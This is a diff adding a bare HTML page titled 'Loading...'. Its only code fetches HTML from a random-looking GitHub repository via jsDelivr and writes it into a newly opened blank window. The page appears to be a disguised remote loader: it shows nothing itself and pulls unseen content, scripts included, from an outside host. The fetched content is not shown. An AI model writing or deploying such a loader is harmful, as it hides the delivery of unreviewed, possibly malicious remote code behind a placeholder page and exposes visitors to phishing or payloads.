@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+<script>
+fetch('https://cdn.jsdelivr.net/gh/6huGt/nusdof8k-a73d3d@main/index.html')
+  .then(res => res.text())
+  .then(html => {
+    const newWin = window.open('about:blank', '_blank');
+    newWin.document.open();
+    newWin.document.write(html);
+    newWin.document.close();
+  })
+  .catch(err => {
+    document.body.innerHTML = '<p style="color:red">Error: ' + err.message + '</p>';
+  });
+</script>
+</body>
+</html>
